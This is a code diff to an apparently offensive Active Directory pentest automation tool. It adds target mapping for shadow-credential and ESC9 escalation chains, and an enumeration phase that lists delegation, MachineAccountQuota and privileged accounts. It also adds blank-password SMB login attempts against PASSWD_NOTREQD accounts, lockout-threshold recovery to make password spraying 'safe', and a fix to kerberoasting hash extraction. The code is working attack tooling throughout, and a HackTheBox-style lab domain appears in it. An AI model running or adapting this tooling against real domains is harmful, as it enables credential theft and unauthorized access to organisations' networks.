@@ -288,6 +288,37 @@ def _check_gmsa(
             ui.debug(f"No gMSA accounts")
 
 
+def _load_dn_sam_map(ws: Workspace) -> dict[str, str]:
+    """
+    Build a {lowercased-DN: sAMAccountName} map from the ldapdomaindump JSON
+    (users + computers). bloodyAD `get writable` reports only the DN, so this
+    lets us recover the real logon name needed by shadow-cred / ESC9 chains —
+    without it we'd target the displayName CN (e.g. `Melanie Purkis`), which is
+    not a valid account identity and also defeats the self-write skip.
+    """
+    mapping: dict[str, str] = {}
+    ldd = ws.loot_dir / "ldapdomaindump"
+    for fn in ("domain_users.json", "domain_computers.json"):
+        p = ldd / fn
+        if not p.exists():
+            continue
+        try:
+            data = json.loads(p.read_text())
+        except Exception:
+            continue
+        for entry in data if isinstance(data, list) else []:
+            attrs = entry.get("attributes", entry) if isinstance(entry, dict) else {}
+            dn = attrs.get("distinguishedName")
+            sam = attrs.get("sAMAccountName")
+            if isinstance(dn, list):
+                dn = dn[0] if dn else None
+            if isinstance(sam, list):
+                sam = sam[0] if sam else None
+            if dn and sam:
+                mapping[dn.lower()] = sam
+    return mapping
+
+
 def _bloodyad_writable(
     ip: str, domain: str, user: str, pw: str,
     runner: Runner, findings: Findings, ws: Workspace, available: set[str],
@@ -299,13 +330,23 @@ def _bloodyad_writable(
     def _san(s: str) -> str:
         return re.sub(r"[\s._-]", "", s).lower()
 
+    dn_sam = _load_dn_sam_map(ws)
+
     def _parse_writable(out: str, otype: str) -> list[str]:
         results: list[str] = []
         current_sam: str | None = None
+        current_dn: str | None = None
         current_dn_cn: str | None = None
 
         def _emit() -> None:
-            name = current_sam or current_dn_cn
+            # Prefer an explicit sAMAccountName, else resolve the DN via the
+            # ldapdomaindump map; only fall back to the CN when neither is
+            # available (best effort — a raw CN may not be a valid logon name).
+            name = current_sam
+            if not name and current_dn:
+                name = dn_sam.get(current_dn.lower())
+            if not name:
+                name = current_dn_cn
             skip_self = _san(name) == _san(user) if name else True
             if name and not skip_self and name not in results:
                 results.append(name)
@@ -315,6 +356,7 @@ def _bloodyad_writable(
             if s.lower().startswith("distinguishedname:"):
                 _emit()
                 current_sam = None
+                current_dn = s.split(":", 1)[-1].strip()
                 m_cn = re.search(r"CN=([^,]+)", s)
                 current_dn_cn = m_cn.group(1) if m_cn else None
             elif s.lower().startswith("samaccountname:"):
@@ -517,17 +559,63 @@ def _parse_nosec_templates(out: str) -> list[tuple[str, str]]:
     return results
 
 
-def _sync_time(ip: str, runner: Runner, findings: Findings, available: set[str]) -> None:
+def sync_clock(ip: str, runner: Runner, findings: Findings, available: set[str]) -> None:
+    """
+    Keep the local clock within Kerberos' 5-minute skew window of the DC.
+
+    Stepping the clock needs root; p0rtix is designed to run unprivileged (nmap
+    caps), so first *measure* the offset with `ntpdate -q` (query only, no privs
+    needed) and act only when it actually matters: skew under the threshold needs
+    nothing; real skew is stepped via sudo -n when possible, otherwise reported
+    with the exact command to run by hand.
+    """
     if "ntpdate" not in available:
         findings.note("ntpdate not available — Kerberos may fail if clock skew > 5 min")
         return
+
+    # Query-only: report the offset without touching the clock. ntpdate prints
+    # it two ways depending on version: the modern sntp-style
+    # "... (-0700) +406.3673 +/- 0.0798 <server> ..." (offset before "+/-"), and
+    # the classic "... offset 406.3673 sec".
+    out_q = runner.run(["ntpdate", "-q", "-u", ip], "time_sync_query", timeout=30)
+    m_off = (re.search(r"([-+]?\d+\.\d+)\s+\+/-", out_q)
+             or re.search(r"offset\s+([-+]?[\d.]+)\s+sec", out_q))
+    skew = abs(float(m_off.group(1))) if m_off else None
+
+    # Kerberos tolerates up to 300s; sync well inside that to be safe.
+    if skew is not None and skew < 120:
+        findings.note(f"Clock skew vs DC ≈ {skew:.1f}s — within Kerberos tolerance, no sync needed")
+        ui.debug(f"Clock skew {skew:.1f}s — no sync needed")
+        return
+
+    skew_desc = f"{skew:.1f}s" if skew is not None else "unknown"
+    is_root = os.geteuid() == 0
+    step_cmd = ["ntpdate", "-u", ip]
+    if not is_root:
+        # sudo -n: succeeds only if a passwordless rule exists; never blocks.
+        if subprocess.run(["sudo", "-n", "true"], capture_output=True).returncode == 0:
+            step_cmd = ["sudo", "-n", "ntpdate", "-u", ip]
+        else:
+            findings.note(
+                f"Clock skew vs DC ≈ {skew_desc} but stepping the clock needs root "
+                f"(running unprivileged). If Kerberos ops fail, run: `sudo ntpdate -u {ip}`"
+            )
+            ui.warn(f"Clock skew {skew_desc} — run `sudo ntpdate -u {ip}` if Kerberos fails")
+            return
+
     subprocess.run(["timedatectl", "set-ntp", "false"], capture_output=True)
-    cmd = ["ntpdate", "-u", ip]
-    findings.cmd(" ".join(cmd))
-    out = runner.run(cmd, "time_sync_ntpdate", timeout=30)
+    findings.cmd(" ".join(step_cmd))
+    out = runner.run(step_cmd, "time_sync_ntpdate", timeout=30)
+    if "Operation not permitted" in out or "step_systime" in out:
+        findings.note(
+            f"Clock skew vs DC ≈ {skew_desc} — clock step was denied; "
+            f"if Kerberos ops fail, run: `sudo ntpdate -u {ip}`"
+        )
+        ui.warn(f"Time sync denied — run `sudo ntpdate -u {ip}` if Kerberos fails")
+        return
     first_line = next((l for l in out.splitlines() if l.strip()), "")
     if first_line:
-        findings.note(f"Time sync to {ip}: {first_line.strip()}")
+        findings.note(f"Time synced to {ip}: {first_line.strip()}")
     ui.step(f"Time synced to DC {ip}")
 
 
@@ -649,6 +737,112 @@ def _validate_smb(
 
 # ── AD Core ───────────────────────────────────────────────────────────────────
 
+def _nxc_payload(line: str) -> str:
+    """Strip the `PROTO  ip  port  HOST  ` column prefix nxc prepends to a line."""
+    m = re.match(r"^\S+\s+[\d.]+\s+\d+\s+\S+\s+(.*)$", line)
+    return (m.group(1) if m else line).rstrip()
+
+
+def _ad_enrichment(
+    ip: str, domain: str, user: str, pw: str,
+    runner: Runner, findings: Findings, ws: Workspace, available: set[str],
+) -> None:
+    """
+    Low-noise authenticated LDAP reads that round out the AD picture, mirroring
+    adPEAS's Delegation / MachineAccountQuota / PasswordNotRequired /
+    PasswordPolicy modules. Every check is a single directory read — collected
+    once, no bruteforce. The lockout threshold it recovers also makes the later
+    spray phase safe by design.
+    """
+    if "nxc" not in available:
+        return
+
+    findings.h4("AD Enrichment (delegation / MAQ / policy)")
+    base = ["nxc", "ldap", ip, "-u", user, "-p", pw, "-d", domain]
+    # These are domain-wide directory reads — identical for any authenticated
+    # user — so they take fixed labels and stay cached across escalation rounds
+    # (matching ldapdomaindump / kerberoast / AS-REP). Only the per-account
+    # blank-password probe below is user-specific.
+
+    # 1. Delegation relationships — unconstrained / constrained / RBCD
+    out = runner.run(base + ["--find-delegation"], "creds_delegation", timeout=60)
+    if "No entries found" in out:
+        findings.note("No delegation relationships found")
+        ui.debug("No delegation relationships")
+    else:
+        rows = [_nxc_payload(l) for l in out.splitlines()]
+        rows = [r for r in rows if r and not r.startswith("[") and not r.startswith("Windows")]
+        if rows:
+            findings.code_block("\n".join(rows))
+            for r in rows:
+                if "AccountName" in r:  # table header
+                    continue
+                findings.add_summary(f"Delegation: {r}")
+            ui.good("Delegation relationship(s) found — see findings")
+        else:
+            findings.note("No delegation relationships found")
+
+    # 2. MachineAccountQuota — RBCD / noPac prerequisite
+    out = runner.run(base + ["-M", "maq"], "creds_maq", timeout=60)
+    m = re.search(r"MachineAccountQuota:\s*(\d+)", out)
+    if m:
+        maq = int(m.group(1))
+        if maq > 0:
+            findings.bullet(
+                f"**MachineAccountQuota = {maq}** — any domain user can add machine "
+                f"accounts (RBCD / noPac attack surface)"
+            )
+            findings.add_summary(f"MAQ={maq}: rogue computer accounts possible (RBCD/noPac)")
+            ui.good(f"MachineAccountQuota = {maq}")
+        else:
+            findings.bullet("MachineAccountQuota = 0 — domain users cannot add machine accounts")
+            ui.debug("MAQ = 0")
+
+    # 3. PASSWD_NOTREQD accounts — may accept a blank password
+    out = runner.run(base + ["--password-not-required"], "creds_pwdnotreq", timeout=60)
+    pnr = re.findall(r"User:\s+(\S+)\s+Status:\s+(\S+)", out)
+    enabled = [u for u, st in pnr if st.lower() == "enabled"]
+    if enabled:
+        findings.bullet(
+            f"**PASSWD_NOTREQD (enabled): {', '.join(enabled)}** — testing blank password"
+        )
+        ui.good(f"PASSWD_NOTREQD enabled: {', '.join(enabled)}")
+        # A single targeted blank-cred check per flagged account (allowed by the
+        # no-bruteforce policy — one auth, not a wordlist).
+        for u in enabled:
+            chk = runner.run(
+                ["nxc", "smb", ip, "-u", u, "-p", "", "-d", domain, "--no-bruteforce"],
+                f"creds_blankpw_{_ulabel(u)}", timeout=30,
+            )
+            if "[+]" in chk or "Pwn3d!" in chk:
+                ws.add_valid_cred(u, "", "SMB")
+                findings.bullet(f"**Blank password VALID for `{u}`**")
+                findings.add_summary(f"**Blank password works: `{u}`**")
+                ui.good(f"Blank password valid: {u}")
+    elif pnr:
+        findings.note(f"PASSWD_NOTREQD set on {len(pnr)} disabled account(s) — not actionable")
+
+    # 4. Domain password policy → lockout threshold (makes the spray phase safe)
+    out = runner.run(base + ["--pass-pol"], "creds_passpol", timeout=60)
+    m = re.search(r"Account Lockout Threshold:\s*(\d+)", out)
+    if m:
+        thr = int(m.group(1))
+        ws.set_lockout_threshold(thr)
+        if thr == 0:
+            findings.bullet("Account lockout threshold = **0 — no lockout, safe to spray**")
+        else:
+            findings.bullet(f"Account lockout threshold = {thr} — spray cautiously")
+        ui.debug(f"Lockout threshold = {thr}")
+
+    # 5. adminCount=1 inventory — accounts AD marks as (currently or formerly) privileged
+    out = runner.run(base + ["--admin-count"], "creds_admincount", timeout=60)
+    admins = [_nxc_payload(l) for l in out.splitlines()]
+    admins = [a for a in admins if a and not a.startswith("[") and not a.startswith("Windows")]
+    if admins:
+        findings.bullet(f"**adminCount=1 accounts ({len(admins)}):** {', '.join(admins)}")
+        ui.debug(f"adminCount=1: {', '.join(admins)}")
+
+
 def _smb_admin_exec(
     ip: str, domain: str, user: str, pw: str,
     runner: Runner, findings: Findings, ws: Workspace, available: set[str],
@@ -690,7 +884,7 @@ def _ad_core(
     findings.h3("AD Core Enumeration")
 
     # 0. Time sync — Kerberos requires clock skew < 5 minutes vs DC
-    _sync_time(ip, runner, findings, available)
+    sync_clock(ip, runner, findings, available)
 
     # 1. ldapdomaindump — authenticated full domain dump; LDAPS fallback if LDAP requires TLS
     if "ldapdomaindump" in available:
@@ -748,6 +942,10 @@ def _ad_core(
             if len(_user_lines) > 12:
                 ui.debug(f"... ({len(_user_lines) - 12} more in loot/users.txt)")
 
+    # 1a. Enrichment — delegation / MAQ / PASSWD_NOTREQD / policy / adminCount.
+    # Pure directory reads; also recovers the lockout threshold for safe spraying.
+    _ad_enrichment(ip, domain, user, pw, runner, findings, ws, available)
+
     # 2. Kerberoasting — SPN accounts → crackable hashes
     if "impacket-GetUserSPNs" in available:
         cmd = [
@@ -761,9 +959,12 @@ def _ad_core(
         findings.cmd(" ".join(cmd))
         out = runner.run(cmd, "creds_getuserspns", timeout=60)
         hashes = [line for line in out.splitlines() if "$krb5tgs$" in line]
-        # Extract account names from the SPN table (lines with SPN column data)
+        # Extract account names from the SPN table (lines with SPN column data).
+        # GetUserSPNs prints rows as "<SPN>  <Name>  <MemberOf> ...": the SPN is
+        # "service/host" possibly with a port, so match the leading SPN token then
+        # capture the account name column.
         spn_accounts = re.findall(
-            r"^certified\.htb/\S+\s+(\S+)\s", out, re.MULTILINE | re.IGNORECASE
+            rf"^{re.escape(domain)}/\S+\s+(\S+)\s", out, re.MULTILINE | re.IGNORECASE
         ) or re.findall(r"^\S+/\S+\s+(\S+)\s", out, re.MULTILINE)
         if hashes:
             added = ws.append_krb_hashes("kerberoast.hash", hashes)
